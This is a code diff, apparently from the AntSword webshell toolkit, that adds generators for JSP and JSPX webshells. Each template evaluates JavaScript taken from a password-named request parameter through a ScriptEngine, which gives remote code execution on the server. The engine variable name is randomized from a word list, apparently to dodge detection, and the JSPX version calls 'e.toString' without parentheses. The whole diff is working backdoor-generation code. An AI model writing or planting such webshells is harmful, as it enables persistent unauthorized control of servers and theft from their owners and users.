@@ -22,10 +22,51 @@ class Core {
         case "jspx":
           res(self._gen_jspx(argv.pwd));
           break;
+        case "jspjs":
+          res(self._gen_jspjs(argv.pwd));
+          break;
+        case "jspxjs":
+          res(self._gen_jspxjs(argv.pwd));
+          break;
         default:
           break;
       }
     })
+  }
+
+  _gen_jspjs(pwd) {
+    var data = `<%
+  try {
+    javax.script.ScriptEngine PENGINENAME = new javax.script.ScriptEngineManager().getEngineByName("js");
+    PENGINENAME.put("request", request);
+    PENGINENAME.put("response", response);
+    PENGINENAME.eval(request.getParameter("${pwd}"));
+  } catch (Exception e) {
+    out.println("Error:// "+e.toString());;
+  }
+%>`;
+    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
+    data = data.replace(/PENGINENAME/g, vars[0].toLowerCase());
+    return data;
+  }
+
+  _gen_jspxjs(pwd) {
+    var data = `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+<jsp:directive.page contentType="text/html" pageEncoding="UTF-8" />
+  <jsp:scriptlet>
+    try {
+      javax.script.ScriptEngine PENGINENAME = new javax.script.ScriptEngineManager().getEngineByName("js");
+      PENGINENAME.put("request", request);
+      PENGINENAME.put("response", response);
+      PENGINENAME.eval(request.getParameter("${pwd}"));
+    } catch (Exception e) {
+      out.println("Error:// "+e.toString);;
+    }
+  </jsp:scriptlet>
+</jsp:root>`;
+    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
+    data = data.replace(/PENGINENAME/g, vars[0].toLowerCase());
+    return data;
   }
 
   _gen_jspx(pwd) {
